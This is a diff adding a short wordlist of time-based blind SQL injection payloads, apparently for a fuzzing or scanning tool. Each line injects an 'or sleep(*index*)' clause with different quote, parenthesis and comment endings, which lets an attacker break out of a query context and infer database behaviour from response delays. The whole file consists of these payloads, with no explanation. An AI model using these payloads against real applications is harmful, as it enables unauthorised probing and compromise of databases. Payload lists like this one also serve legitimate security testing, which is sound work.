@@ -1,0 +1,12 @@
+sleep(*index*)#
+1 or sleep(*index*)#
+" or sleep(*index*)#
+' or sleep(*index*)#
+" or sleep(*index*)="
+' or sleep(*index*)='
+1) or sleep(*index*)#
+") or sleep(*index*)="
+') or sleep(*index*)='
+1)) or sleep(*index*)#
+")) or sleep(*index*)="
+')) or sleep(*index*)='
